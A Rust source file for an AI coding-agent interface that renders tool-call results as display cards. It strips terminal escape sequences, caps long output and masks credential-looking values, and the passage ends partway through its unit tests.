//! Tool cards as the window draws them: one pure shaper per tool kind (`$ cmd` with exit code, numbered
//! file lines, grouped matches, unified diff, MCP result, web page, sub-agent, generic) turning an
//! `Item::Tool` into a [`Card`] of at most a screenful of rows. No GPUI: the painter only colours
//! [`Tone`]s. Tool output is untrusted data: control and escape sequences are stripped and the text is
//! capped before any layout, and only the rows that are drawn are wrapped, so a 10 000 line output
//! costs one pass over its bytes.

use std::collections::HashMap;
use std::hash::{Hash, Hasher};
use std::rc::Rc;
use std::sync::OnceLock;

use regex::Regex;
use serde_json::Value;
use synthesis_events::ToolStatus;
use synthesis_harness::sanitize_for_display;
use synthesis_tui_base::text::char_width;

use crate::convo::{Item, ToolState};

/// Body rows of a collapsed card.
pub const COLLAPSED: usize = 5;
/// Body rows of an open card; the rest is counted ("+N lines"), not laid out.
pub const OPEN_MAX: usize = 400;
/// Bytes of one output that are looked at; the event already carries the head and tail of a longer one.
pub const BYTE_CAP: usize = 256 * 1024;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    Command,
    Read,
    Search,
    Edit,
    Mcp,
    Web,
    Agent,
    Generic,
}

pub fn kind_of(name: &str) -> Kind {
    match name {
        "Bash" | "BashOutput" | "KillShell" | "terminal_spawn" | "terminal_logs" => Kind::Command,
        "Read" => Kind::Read,
        "Grep" | "Glob" => Kind::Search,
        "Edit" | "Write" | "MultiEdit" => Kind::Edit,
        "WebFetch" | "WebSearch" => Kind::Web,
        "Task" | "Agent" => Kind::Agent,
        n if n.starts_with("mcp__") => Kind::Mcp,
        _ => Kind::Generic,
    }
}

/// How a call stands; one glyph each, the same for every kind.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Glyph {
    Running,
    Ok,
    Error,
    Denied,
    Interrupted,
}

impl Glyph {
    /// `Running` is drawn as the spinner by the painter; this is its steady form.
    pub fn mark(self) -> &'static str {
        match self {
            Glyph::Running => "\u{25CF}",
            Glyph::Ok => "\u{2713}",
            Glyph::Error => "\u{2717}",
            Glyph::Denied => "\u{2298}",
            Glyph::Interrupted => "\u{25A0}",
        }
    }

    fn word(self) -> &'static str {
        match self {
            Glyph::Running => "running",
            Glyph::Ok => "done",
            Glyph::Error => "failed",
            Glyph::Denied => "denied",
            Glyph::Interrupted => "interrupted",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Tone {
    Text,
    Dim,
    Strong,
    Accent,
    Ok,
    Err,
    Warn,
    Add,
    Del,
    Hunk,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Badge {
    pub text: String,
    pub tone: Tone,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Row {
    /// The line number in the gutter (continuation rows of a wrapped line have none).
    pub no: Option<u32>,
    pub tone: Tone,
    pub text: String,
    /// Source code: the painter colours its syntax.
    pub code: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Card {
    pub kind: Kind,
    pub glyph: Glyph,
    pub head: String,
    /// Second text after the head: MCP arguments, a page title, an agent type.
    pub sub: String,
    pub badges: Vec<Badge>,
    pub rows: Vec<Row>,
    /// Lines not drawn ("+N lines"); a line cut at the row limit counts.
    pub hidden: usize,
    /// More than a collapsed card shows: the header gets a chevron and the body a toggle.
    pub collapsible: bool,
    /// Digits of the widest line number, for the gutter.
    pub gutter: usize,
}

// ---- text hygiene -------------------------------------------------------------------------------

/// `s` without escape sequences (CSI, OSC and other strings, two-char escapes), control characters and
/// invisible or bidi characters (made visible by `sanitize_for_display`); a tab becomes four spaces.
pub fn clean(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut it = s.chars();
    while let Some(c) = it.next() {
        match c {
            '\x1b' => match it.next() {
                Some('[') => {
                    for n in it.by_ref() {
                        if ('\x40'..='\x7e').contains(&n) {
                            break;
                        }
                    }
                }
                Some(']' | 'P' | '_' | '^' | 'X') => {
                    while let Some(n) = it.next() {
                        if n == '\x07' {
                            break;
                        }
                        if n == '\x1b' {
                            it.next();
                            break;
                        }
                    }
                }
                _ => {}
            },
            '\t' => out.push_str("    "),
            c if c.is_control() => {}
            c => out.push(c),
        }
    }
    sanitize_for_display(&out)
}

/// Lines of `s` split at LF, CRLF and a lone CR; no empty line after a final break.
fn split(s: &str) -> impl Iterator<Item = &str> {
    let mut rest = s;
    std::iter::from_fn(move || {
        if rest.is_empty() {
            return None;
        }
        let (line, next) = match rest.find(['\n', '\r']) {
            None => (rest, ""),
            Some(i) => {
                let skip = if rest[i..].starts_with("\r\n") { 2 } else { 1 };
                (&rest[..i], &rest[i + skip..])
            }
        };
        rest = next;
        Some(line)
    })
}

/// At most [`BYTE_CAP`] bytes of `s` (its start, or its end when `tail`), cut on a char boundary.
fn cap(s: &str, tail: bool) -> (&str, bool) {
    if s.len() <= BYTE_CAP {
        return (s, false);
    }
    if tail {
        let mut i = s.len() - BYTE_CAP;
        while !s.is_char_boundary(i) {
            i += 1;
        }
        (&s[i..], true)
    } else {
        let mut i = BYTE_CAP;
        while !s.is_char_boundary(i) {
            i -= 1;
        }
        (&s[..i], true)
    }
}

/// Does a key or variable name look like it holds a credential?
fn secret_name(k: &str) -> bool {
    let k = k.to_ascii_lowercase();
    k == "sig"
        || [
            "key",
            "token",
            "secret",
            "passw",
            "credential",
            "auth",
            "cookie",
            "bearer",
            "private",
            "signature",
        ]
        .iter()
        .any(|w| k.contains(w))
}

/// `v` with the value of every secret-looking key replaced (nested too).
fn mask(v: &Value) -> Value {
    match v {
        Value::Object(o) => Value::Object(
            o.iter()
                .map(|(k, x)| {
                    let x = if secret_name(k) {
                        Value::from("[redacted]")
                    } else {
                        mask(x)
                    };
                    (k.clone(), x)
                })
                .collect(),
        ),
        Value::Array(a) => Value::Array(a.iter().map(mask).collect()),
        v => v.clone(),
    }
}

/// `s` with credentials masked: `NAME=value` and `--flag=value` for secret-looking names, secret
/// query parameters and `user:pass@` in URLs, `Authorization`/cookie headers, bearer tokens and a few
/// well-known key shapes. Best effort for a header line; the event stream itself is not changed.
// shortcut: name and shape heuristics, a secret in a plain argument (`mycli login hunter2`) stays.
pub fn redact_text(s: &str) -> String {
    static ENV: OnceLock<Regex> = OnceLock::new();
    static QUERY: OnceLock<Regex> = OnceLock::new();
    static USER: OnceLock<Regex> = OnceLock::new();
    static HDR: OnceLock<Regex> = OnceLock::new();
    static SHAPE: OnceLock<Regex> = OnceLock::new();
    let t = rx(
        &ENV,
        r#"\b([A-Za-z_][A-Za-z0-9_-]*)=("[^"]*"|'[^']*'|[^\s"'&]+)"#,
    )
    .replace_all(s, |c: &regex::Captures| {
        if secret_name(&c[1]) {
            format!("{}=[redacted]", &c[1])
        } else {
            c[0].to_string()
        }
    });
    let t = rx(
        &QUERY,
        r#"(?i)([?&][a-z0-9_.-]*(?:token|key|sig|signature|secret|passw|auth|code|session)[a-z0-9_.-]*=)[^&\s#"']+"#,
    )
    .replace_all(&t, "${1}[redacted]");
    let t = rx(&USER, r"(?i)(\b[a-z][a-z0-9+.-]*://[^\s/:@]+:)[^\s/@]+@")
        .replace_all(&t, "${1}[redacted]@");
    let t = rx(
        &HDR,
        r#"(?i)\b(authorization|proxy-authorization|x-api-key|api-key|cookie|set-cookie)(\s*:\s*)[^"'\n]+"#,
    )
    .replace_all(&t, "${1}${2}[redacted]");
    rx(
        &SHAPE,
        r"(?i)\bbearer\s+[A-Za-z0-9._~+/=-]{8,}|\bsk-[A-Za-z0-9_-]{16,}|\bgh[pousr]_[A-Za-z0-9]{20,}|\bAKIA[0-9A-Z]{16}\b|\bxox[baprs]-[A-Za-z0-9-]{10,}",
    )
    .replace_all(&t, "[redacted]")
    .into_owned()
}

/// A header line from an input field: credentials masked, then every control or escape made
/// visible (`sanitize_for_display`: nothing is dropped, an unterminated OSC cannot hide the rest of a
/// command), cut to `n` chars with an ellipsis.
fn head_text(s: &str, n: usize) -> String {
    let pre: String = s.chars().take(n * 2).collect();
    let more = pre.len() < s.len();
    let t = sanitize_for_display(&redact_text(&pre));
    if more || t.chars().count() > n {
        let mut c: String = t.chars().take(n).collect();
        c.push('\u{2026}');
        c
    } else {
        t
    }
}

/// The nesting depth of JSON text (a rough scan: brackets outside strings).
fn json_depth(t: &str) -> usize {
    let (mut d, mut max, mut in_str, mut esc) = (0usize, 0usize, false, false);
    for b in t.bytes() {
        if in_str {
            match (esc, b) {
                (true, _) => esc = false,
                (_, b'\\') => esc = true,
                (_, b'"') => in_str = false,
                _ => {}
            }
        } else {
            match b {
                b'"' => in_str = true,
                b'[' | b'{' => {
                    d += 1;
                    max = max.max(d);
                }
                b']' | b'}' => d = d.saturating_sub(1),
                _ => {}
            }
        }
    }
    max
}

pub fn ms_label(ms: u64) -> String {
    match ms {
        0..=999 => format!("{ms}ms"),
        1000..=59_999 => format!("{:.1}s", ms as f64 / 1000.),
        _ => format!("{}m {:02}s", ms / 60_000, ms / 1000 % 60),
    }
}

// ---- windowing ----------------------------------------------------------------------------------

/// `text` as rows of at most `cols` terminal cells (wide glyphs count 2), at most `limit + 1` rows so
/// the window can tell that a line was cut. Only the first row carries `no`.
fn wrap(
    text: &str,
    no: Option<u32>,
    tone: Tone,
    code: bool,
    cols: usize,
    limit: usize,
) -> Vec<Row> {
    let mut rows = vec![];
    let (mut cur, mut w) = (String::new(), 0);
    let push = |rows: &mut Vec<Row>, cur: &mut String| {
        rows.push(Row {
            no: if rows.is_empty() { no } else { None },
            tone,
            text: std::mem::take(cur),
            code,
        });
    };
    for c in clean(text).chars() {
        let cw = char_width(c);
        if w + cw > cols && !cur.is_empty() {
            push(&mut rows, &mut cur);
            w = 0;
            if rows.len() > limit {
                return rows;
            }
        }
        cur.push(c);
        w += cw;
    }
    push(&mut rows, &mut cur);
    rows
}

/// Entries are logical lines already wrapped to rows. Returns the first (or last, `tail`) `limit` rows
/// and how many of the `total` entries are not fully among them.
fn window(
    total: usize,
    entries: impl Iterator<Item = Vec<Row>>,
    limit: usize,
    tail: bool,
) -> (Vec<Row>, usize) {
    let mut rows: Vec<Row> = vec![];
    let mut whole = 0;
    if tail {
        let all: Vec<Vec<Row>> = entries.collect();
        for e in all.into_iter().rev() {
            let room = limit - rows.len();
            if e.len() > room {
                rows.extend(e.into_iter().rev().take(room));
                break;
            }
            rows.extend(e.into_iter().rev());
            whole += 1;
            if rows.len() == limit {
                break;
            }
        }
        rows.reverse();
    } else {
        for e in entries {
            let room = limit - rows.len();
            if e.len() > room {
                rows.extend(e.into_iter().take(room));
                break;
            }
            rows.extend(e);
            whole += 1;
            if rows.len() == limit {
                break;
            }
        }
    }
    (rows, total.saturating_sub(whole))
}

/// Plain text lines as a window: `tail` for command output, the start for everything else.
fn text_window(text: &str, tone: Tone, cols: usize, limit: usize, tail: bool) -> (Vec<Row>, usize) {
    let total = split(text).count();
    let skip = if tail { total.saturating_sub(limit) } else { 0 };
    let n = if tail { total - skip } else { total };
    let entries = split(text)
        .skip(skip)
        .take(n)
        .map(|l| wrap(l, None, tone, false, cols, limit));
    // `total` for the head window; for the tail the skipped lines are hidden by definition
    let (rows, hidden) = window(n, entries, limit, tail);
    (rows, hidden + skip)
}

// ---- shaping ------------------------------------------------------------------------------------

/// A string field of a tool input, at most [`BYTE_CAP`] bytes of it.
fn s<'a>(v: &'a Value, k: &str) -> Option<&'a str> {
    v.get(k).and_then(Value::as_str).map(|x| cap(x, false).0)
}

fn badge(text: impl Into<String>, tone: Tone) -> Badge {
    Badge {
        text: text.into(),
        tone,
    }
}

fn glyph_of(state: ToolState, status: Option<ToolStatus>) -> Glyph {
    match (state, status) {
        (ToolState::Running, _) => Glyph::Running,
        (ToolState::Ok, _) => Glyph::Ok,
        (ToolState::Failed, _) => Glyph::Error,
        (ToolState::NotRun, Some(ToolStatus::Interrupted)) => Glyph::Interrupted,
        (ToolState::NotRun, _) => Glyph::Denied,
    }
}

fn rx(cell: &'static OnceLock<Regex>, p: &str) -> &'static Regex {
    cell.get_or_init(|| Regex::new(p).expect("static pattern"))
}

/// The card for `item` (None for rows that are not tool calls). `open`: the user expanded it;
/// `cols`: terminal cells per row. Missing fields (older sessions) give a plainer card, never a panic.
pub fn shape(item: &Item, open: bool, cols: usize) -> Option<Card> {
    let Item::Tool {
        name,
        summary,
        state,
        preview,
        output,
        duration_ms,
        diff,
        input,
        status,
        exit_code,
        ..
    } = item
    else {
        return None;
    };
    let cols = cols.max(20);
    let kind = kind_of(name);
    let glyph = glyph_of(*state, *status);
    let limit = if open {
        OPEN_MAX
    } else if kind == Kind::Agent {
        1
    } else {
        COLLAPSED
    };
    let raw = if output.is_empty() { preview } else { output };
    let (raw, capped) = cap(raw, kind == Kind::Command);
    let err = if glyph == Glyph::Error {
        Tone::Err
    } else {
        Tone::Text
    };
    let mut card = Card {
        kind,
        glyph,
        head: head_text(summary, 300),
        sub: String::new(),
        badges: vec![],
        rows: vec![],
        hidden: 0,
        collapsible: false,
        gutter: 0,
    };
    if kind == Kind::Generic && !input.is_null() {
        card.head = head_text(&generic_summary(input), 300);
    }
    let dur = (*duration_ms > 0).then(|| badge(ms_label(*duration_ms), Tone::Dim));
    let (rows, hidden) = match kind {
        Kind::Command => command(&mut card, input, *exit_code, raw, cols, limit),
        Kind::Read => read(&mut card, input, raw, err, cols, limit),
        Kind::Search => search(&mut card, name, input, raw, cols, limit),
        Kind::Edit => edit(
            &mut card,
            name,
            input,
            diff.as_ref(),
            glyph,
            raw,
            cols,
            limit,
        ),
        Kind::Mcp => mcp(&mut card, name, input, raw, err, cols, limit),
        Kind::Web => web(&mut card, name, input, raw, cols, limit),
        Kind::Agent => agent(&mut card, input, raw, cols, limit),
        Kind::Generic => text_window(raw, err, cols, limit, false),
    };
    if kind == Kind::Agent {
        card.badges.insert(
            0,
            badge(
                glyph.word(),
                match glyph {
                    Glyph::Ok => Tone::Ok,
                    Glyph::Running => Tone::Warn,
                    _ => Tone::Err,
                },
            ),
        );
    }
    card.badges.extend(dur);
    if capped {
        card.badges.push(badge("cut", Tone::Dim));
    }
    card.gutter = rows
        .iter()
        .filter_map(|r| r.no)
        .max()
        .map_or(0, |n| n.to_string().len());
    // a card is collapsible when more than its collapsed window exists: lines hidden, or rows past it
    card.collapsible = hidden > 0 || rows.len() > if kind == Kind::Agent { 1 } else { COLLAPSED };
    card.rows = rows;
    card.hidden = hidden;
    Some(card)
}

/// What a tool with no card of its own was given, secrets masked: the usual one-line field or the JSON.
fn generic_summary(input: &Value) -> String {
    ["command", "file_path", "path", "url", "pattern"]
        .iter()
        .find_map(|k| s(input, k))
        .map_or_else(|| mask(input).to_string(), str::to_string)
}

fn command(
    card: &mut Card,
    input: &Value,
    exit_code: Option<i64>,
    raw: &str,
    cols: usize,
    limit: usize,
) -> (Vec<Row>, usize) {
    if let Some(c) = s(input, "command") {
        card.head = format!("$ {}", head_text(c, 300));
    }
    // Bash ends its text with "[exit code N]"
    let trimmed = raw.trim_end();
    let (rest, last) = trimmed.rsplit_once('\n').unwrap_or(("", trimmed));
    let (body, code) = match last
        .strip_prefix("[exit code ")
        .and_then(|r| r.strip_suffix(']'))
        .and_then(|n| n.trim().parse::<i32>().ok())
    {
        Some(n) => (rest, Some(n)),
        None => (raw, None),
    };
    let background = input.get("run_in_background").and_then(Value::as_bool) == Some(true);
    // the structured exit code (`process.exited`) wins; one read from the text is marked as derived
    match (exit_code, code) {
        (Some(0), _) => card.badges.push(badge("exit 0", Tone::Ok)),
        (Some(n), _) => card.badges.push(badge(format!("exit {n}"), Tone::Err)),
        (None, Some(n)) => card.badges.push(badge(format!("~exit {n}"), Tone::Dim)),
        (None, None) => {}
    }
    if background {
        card.badges.push(badge("background", Tone::Accent));
    }
    let tone = if exit_code
        .map_or(code.map(i64::from), Some)
        .is_some_and(|n| n != 0)
    {
        Tone::Err
    } else {
        Tone::Text
    };
    text_window(body, tone, cols, limit, true)
}

/// `%6d\t<line>` as (number, text).
fn numbered(line: &str) -> Option<(u32, &str)> {
    let (a, b) = line.split_once('\t')?;
    Some((a.trim().parse().ok()?, b))
}

fn read(
    card: &mut Card,
    input: &Value,
    raw: &str,
    err: Tone,
    cols: usize,
    limit: usize,
) -> (Vec<Row>, usize) {
    if let Some(p) = s(input, "file_path") {
        card.head = head_text(p, 300);
    }
    let first = split(raw).next().and_then(numbered).map(|n| n.0);
    let last = raw
        .trim_end()
        .rsplit('\n')
        .next()
        .and_then(numbered)
        .map(|n| n.0);
    if let (Some(a), Some(b)) = (first, last) {
        let windowed = input.get("offset").is_some() || input.get("limit").is_some();
        card.badges.push(badge(
            if windowed {
                format!("lines {a}\u{2013}{b}")
            } else {
                format!("{b} lines")
            },
            Tone::Dim,
        ));
    }
    let total = split(raw).count();
    let entries = split(raw).take(limit + 1).map(|l| match numbered(l) {
        Some((n, t)) => wrap(t, Some(n), Tone::Text, true, cols.saturating_sub(7), limit),
        None => wrap(l, None, err, false, cols, limit),
    });
    window(total, entries, limit, false)
}

fn search(
    card: &mut Card,
    name: &str,
    input: &Value,
    raw: &str,
    cols: usize,
    limit: usize,
) -> (Vec<Row>, usize) {
    static LINE: OnceLock<Regex> = OnceLock::new();
    if let Some(p) = s(input, "pattern") {
        card.head = head_text(p, 200);
        if let Some(d) = s(input, "path") {
            card.sub = format!("in {}", head_text(d, 200));
        }
    }
    let content = name == "Grep" && s(input, "output_mode") == Some("content");
    let total = split(raw).count();
    let n = split(raw)
        .filter(|l| {
            !l.is_empty() && *l != "--" && !l.starts_with('\u{2026}') && !l.starts_with("No ")
        })
        .count();
    let unit = match (name, s(input, "output_mode")) {
        ("Grep", Some("content")) => "matches",
        ("Grep", Some("count")) => "files",
        _ => "files",
    };
    if n > 0 {
        card.badges.push(badge(format!("{n} {unit}"), Tone::Dim));
    }
    let mut prev: Option<String> = None;
    let entries = split(raw).take(limit + 1).map(move |l| {
        // `path:N:text` is a match, `path:N-text` a context line
        let hit = rx(&LINE, r"^(.+?):(\d+)([:-])(.*)$").captures(l);
        match (content, hit) {
            (true, Some(c)) => {
                let tone = if &c[3] == ":" { Tone::Text } else { Tone::Dim };
                let mut rows = vec![];
                if prev.as_deref() != Some(&c[1]) {
                    prev = Some(c[1].to_string());
                    rows.extend(wrap(&c[1], None, Tone::Accent, false, cols, limit));
                }
                rows.extend(wrap(
                    &c[4],
                    c[2].parse().ok(),
                    tone,
                    true,
                    cols.saturating_sub(7),
                    limit,
                ));
                rows
            }
            _ => {
                let tone = if l.starts_with('\u{2026}') || l == "--" {
                    Tone::Dim
                } else {
                    Tone::Text
                };
                wrap(l, None, tone, false, cols, limit)
            }
        }
    });
    window(total, entries, limit, false)
}

/// The diff lines of an Edit/Write/MultiEdit built from its input (before `tool.completed.diff`, or
/// in a log written without it): numbered from 1.
fn input_diff(name: &str, input: &Value) -> Vec<(Tone, String)> {
    let lines = |t: &str, tone| {
        // shortcut: 5000 lines of an input are counted and drawn, the rest is ignored
        split(t)
            .take(5000)
            .map(move |l| (tone, l.to_string()))
            .collect::<Vec<_>>()
    };
    let mut out = vec![];
    match name {
        "Write" => out.extend(lines(s(input, "content").unwrap_or(""), Tone::Add)),
        "Edit" => {
            out.extend(lines(s(input, "old_string").unwrap_or(""), Tone::Del));
            out.extend(lines(s(input, "new_string").unwrap_or(""), Tone::Add));
        }
        _ => {
            for e in input
                .get("edits")
                .and_then(Value::as_array)
                .into_iter()
                .flatten()
                .take(1000)
            {
                out.extend(lines(s(e, "old_string").unwrap_or(""), Tone::Del));
                out.extend(lines(s(e, "new_string").unwrap_or(""), Tone::Add));
            }
        }
    }
    out
}

#[allow(clippy::too_many_arguments)]
fn edit(
    card: &mut Card,
    name: &str,
    input: &Value,
    diff: Option<&Value>,
    glyph: Glyph,
    raw: &str,
    cols: usize,
    limit: usize,
) -> (Vec<Row>, usize) {
    let path = diff
        .and_then(|d| s(d, "path"))
        .or_else(|| s(input, "file_path"));
    if let Some(p) = path {
        card.head = head_text(p, 300);
    }
    let count = |d: &Value, k: &str| d.get(k).and_then(Value::as_u64);
    let sign = |t: Tone, x: &str| match t {
        Tone::Add => format!("+ {x}"),
        Tone::Del => format!("- {x}"),
        _ => format!("  {x}"),
    };
    if let Some(d) = diff {
        let (a, r) = (
            count(d, "added").unwrap_or(0),
            count(d, "removed").unwrap_or(0),
        );
        card.badges.push(badge(format!("+{a}"), Tone::Ok));
        card.badges.push(badge(format!("\u{2212}{r}"), Tone::Err));
        if d.get("hidden").and_then(Value::as_bool) == Some(true) {
            return (
                wrap(
                    "contents hidden (secret file)",
                    None,
                    Tone::Dim,
                    false,
                    cols,
                    limit,
                ),
                0,
            );
        }
        let hunks: &[Value] = d
            .get("hunks")
            .and_then(Value::as_array)
            .map_or(&[], Vec::as_slice);
        let ls = |h: &Value| h.get("lines").and_then(Value::as_array).map_or(0, Vec::len);
        let total = hunks.iter().map(|h| 1 + ls(h)).sum::<usize>()
            + usize::from(d.get("truncated").and_then(Value::as_bool) == Some(true));
        let n = |h: &Value, k: &str| count(h, k).unwrap_or(0);
        let entries = hunks
            .iter()
            .flat_map(|h| {
                let head = format!(
                    "@@ -{},{} +{},{} @@",
                    n(h, "old_start"),
                    n(h, "old_lines"),
                    n(h, "new_start"),
                    n(h, "new_lines")
                );
                let lines = h
                    .get("lines")
                    .and_then(Value::as_array)
                    .into_iter()
                    .flatten();
                std::iter::once(wrap(&head, None, Tone::Hunk, false, cols, limit)).chain(lines.map(
                    move |l| {
                        let tone = match s(l, "tag") {
                            Some("+") => Tone::Add,
                            Some("-") => Tone::Del,
                            _ => Tone::Dim,
                        };
                        let no = count(
                            l,
                            if tone == Tone::Del {
                                "old_no"
                            } else {
                                "new_no"
                            },
                        );
                        wrap(
                            &sign(tone, s(l, "text").unwrap_or("")),
                            no.and_then(|x| u32::try_from(x).ok()),
                            tone,
                            true,
                            cols.saturating_sub(7),
                            limit,
                        )
                    },
                ))
            })
            .chain(
                (total > 0 && d.get("truncated").and_then(Value::as_bool) == Some(true))
                    .then(|| wrap("\u{2026} diff cut", None, Tone::Dim, false, cols, limit)),
            )
            .take(limit + 1);
        return window(total, entries, limit, false);
    }
    // no structured diff: a failed call says why, otherwise show the change the input describes
    let from_input = if matches!(glyph, Glyph::Error | Glyph::Denied | Glyph::Interrupted) {
        vec![]
    } else {
        input_diff(name, input)
    };
    if from_input.is_empty() {
        let tone = if glyph == Glyph::Error {
            Tone::Err
        } else {
            Tone::Text
        };
        return text_window(raw, tone, cols, limit, false);
    }
    let add = from_input.iter().filter(|l| l.0 == Tone::Add).count();
    card.badges.push(badge(format!("+{add}"), Tone::Ok));
    card.badges.push(badge(
        format!("\u{2212}{}", from_input.len() - add),
        Tone::Err,
    ));
    let (mut a, mut r) = (0u32, 0u32);
    let entries = from_input.iter().take(limit + 1).map(|(tone, t)| {
        let no = if *tone == Tone::Del { &mut r } else { &mut a };
        *no += 1;
        wrap(
            &sign(*tone, t),
            Some(*no),
            *tone,
            true,
            cols.saturating_sub(7),
            limit,
        )
    });
    window(from_input.len(), entries, limit, false)
}

fn mcp(
    card: &mut Card,
    name: &str,
    input: &Value,
    raw: &str,
    err: Tone,
    cols: usize,
    limit: usize,
) -> (Vec<Row>, usize) {
    if let Some((server, tool)) = name.strip_prefix("mcp__").and_then(|r| r.split_once("__")) {
        card.head = head_text(&format!("{server}:{tool}"), 100);
    }
    if let Some(o) = input.as_object() {
        let args: Vec<String> = o
            .iter()
            .take(20)
            .map(|(k, v)| {
                let t = match v {
                    _ if secret_name(k) => "[redacted]".to_string(),
                    Value::String(x) => cap(x, false).0.chars().take(200).collect(),
                    v => mask(v).to_string().chars().take(200).collect(),
                };
                format!("{k}={}", head_text(&t, 40))
            })
            .collect();
        card.sub = head_text(&args.join(", "), 160);
    }
    let t = raw.trim();
    // pretty printing indents every element by its depth: only small, shallow documents are expanded
    let pretty =
        ((t.starts_with('{') || t.starts_with('[')) && t.len() <= 32 * 1024 && json_depth(t) <= 16)
            .then(|| serde_json::from_str::<Value>(t).ok())
            .flatten()
            .and_then(|v| serde_json::to_string_pretty(&v).ok())
            .filter(|p| p.len() <= 128 * 1024);
    text_window(pretty.as_deref().unwrap_or(raw), err, cols, limit, false)
}

fn web(
    card: &mut Card,
    name: &str,
    input: &Value,
    raw: &str,
    cols: usize,
    limit: usize,
) -> (Vec<Row>, usize) {
    static STATUS: OnceLock<Regex> = OnceLock::new();
    if let Some(h) = s(input, if name == "WebFetch" { "url" } else { "query" }) {
        card.head = head_text(h, 300);
    }
    let top: Vec<&str> = split(raw).take(10).collect();
    if let Some(code) = top
        .iter()
        .find_map(|l| rx(&STATUS, r"(?i)\b(?:http|status)\b[: /]*(\d{3})\b").captures(l))
        .and_then(|c| c[1].parse::<u16>().ok())
    {
        card.badges.push(badge(format!("~HTTP {code}"), Tone::Dim));
    }
    if let Some(t) = top.iter().find_map(|l| {
        let l = l.trim();
        l.strip_prefix("# ")
            .or_else(|| l.strip_prefix("Title:"))
            .or_else(|| l.strip_prefix("title:"))
    }) {
        card.sub = format!("~ {}", head_text(t.trim(), 160));
    }
    if name == "WebSearch" {
        let n = split(raw).filter(|l| l.contains("http")).count();
        if n > 0 {
            card.badges.push(badge(format!("{n} results"), Tone::Dim));
        }
    }
    text_window(raw, Tone::Text, cols, limit, false)
}

fn agent(
    card: &mut Card,
    input: &Value,
    raw: &str,
    cols: usize,
    limit: usize,
) -> (Vec<Row>, usize) {
    let name = s(input, "name");
    if let Some(h) = name.or_else(|| s(input, "description")) {
        card.head = head_text(h, 200);
    }
    if let Some(t) = s(input, "subagent_type") {
        card.sub = head_text(t, 60);
    }
    // the last line says where it stands; open, the whole result
    let nonblank: String = split(raw)
        .filter(|l| !l.trim().is_empty())
        .collect::<Vec<_>>()
        .join("\n");
    text_window(&nonblank, Tone::Text, cols, limit, limit == 1)
}

/// Shaped cards by tool call id, so a repaint of an unchanged card shapes nothing. The key is a hash
/// of everything a card depends on (open, width, state, output, ...), so a changed call re-shapes.
#[derive(Default)]
pub struct CardCache(HashMap<String, (u64, Rc<Card>)>);

impl CardCache {
    pub fn get(&mut self, item: &Item, open: bool, cols: usize) -> Option<Rc<Card>> {
        let Item::Tool {
            id,
            name,
            summary,
            state,
            status,
            preview,
            output,
            duration_ms,
            diff,
            exit_code,
            ..
        } = item
        else {
            return None;
        };
        let mut h = std::collections::hash_map::DefaultHasher::new();
        (
            open,
            cols,
            name,
            summary,
            *state as u8,
            status.map(|s| s as u8),
        )
            .hash(&mut h);
        (preview, output, duration_ms, diff.is_some(), exit_code).hash(&mut h);
        let key = h.finish();
        if let Some((k, c)) = self.0.get(id)
            && *k == key
        {
            return Some(c.clone());
        }
        let card = Rc::new(shape(item, open, cols)?);
        // a session has far fewer calls than this; the bound only stops a long-lived window growing
        if self.0.len() > 2000 {
            self.0.clear();
        }
        self.0.insert(id.clone(), (key, card.clone()));
        Some(card)
    }
}

/// A plain-text picture of a card (tests, golden files): header, badges, then the rows with their
/// gutter, then the toggle line.
pub fn dump(c: &Card) -> String {
    let mut out = format!("{} {:?} {}", c.glyph.mark(), c.kind, c.head);
    if !c.sub.is_empty() {
        out += &format!("  [{}]", c.sub);
    }
    for b in &c.badges {
        out += &format!("  <{}>", b.text);
    }
    out.push('\n');
    for r in &c.rows {
        let no = r.no.map_or(String::new(), |n| n.to_string());
        out += &format!("{no:>w$} | {:?} {}\n", r.tone, r.text, w = c.gutter);
    }
    if c.hidden > 0 {
        out += &format!(
            "+{} line{}\n",
            c.hidden,
            if c.hidden == 1 { "" } else { "s" }
        );
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn tool(name: &str, input: Value, output: &str) -> Item {
        Item::Tool {
            id: "t".into(),
            name: name.into(),
            summary: "s".into(),
            state: ToolState::Ok,
            preview: String::new(),
            output: output.into(),
            duration_ms: 12,
            file: None,
            diff: None,
            input: Box::new(input),
            status: Some(ToolStatus::Ok),
            exit_code: None,
        }
    }

    fn lines(n: usize) -> String {
        (1..=n).map(|i| format!("line {i}\n")).collect()
    }

    #[test]
    fn clamp_edges_at_0_1_5_6_and_10000_lines() {
        for (n, rows, hidden, coll) in [
            (0, 0, 0, false),
            (1, 1, 0, false),
            (5, 5, 0, false),
            (6, 5, 1, true),
            (10_000, 5, 9_995, true),
        ] {
            let c = shape(&tool("Foo", json!({}), &lines(n)), false, 80).unwrap();
            assert_eq!(
                (c.rows.len(), c.hidden, c.collapsible),
                (rows, hidden, coll),
                "{n} lines"
            );
        }
        // open: capped at OPEN_MAX, the rest counted
        let c = shape(&tool("Foo", json!({}), &lines(10_000)), true, 80).unwrap();
        assert_eq!((c.rows.len(), c.hidden), (OPEN_MAX, 10_000 - OPEN_MAX));
        // a command shows its tail
        let c = shape(
            &tool("Bash", json!({"command": "seq"}), &lines(10_000)),
            false,
            80,
        )
        .unwrap();
        assert_eq!(c.rows.last().unwrap().text, "line 10000");
        assert_eq!((c.rows.len(), c.hidden), (5, 9_995));
    }

    #[test]
    fn one_very_long_line_is_the_rows_it_fills() {
        let c = shape(&tool("Foo", json!({}), &"x".repeat(6000)), false, 80).unwrap();
        assert_eq!((c.rows.len(), c.hidden, c.collapsible), (5, 1, true));
    }

    #[test]
    fn ansi_controls_crlf_and_wide_glyphs() {
        assert_eq!(
            clean("\x1b[31mred\x1b[0m \x1b]8;;http://x\x07link\x1b]8;;\x07\x07\x08!"),
            "red link!"
        );
        assert_eq!(clean("a\tb"), "a    b");
        let c = shape(&tool("Foo", json!({}), "a\r\nb\rc\n\x1b[2Jd"), false, 80).unwrap();
        assert_eq!(
            c.rows.iter().map(|r| r.text.as_str()).collect::<Vec<_>>(),
            ["a", "b", "c", "d"]
        );
        // 40 wide glyphs are 80 cells: two rows of 40 cells at 40 columns
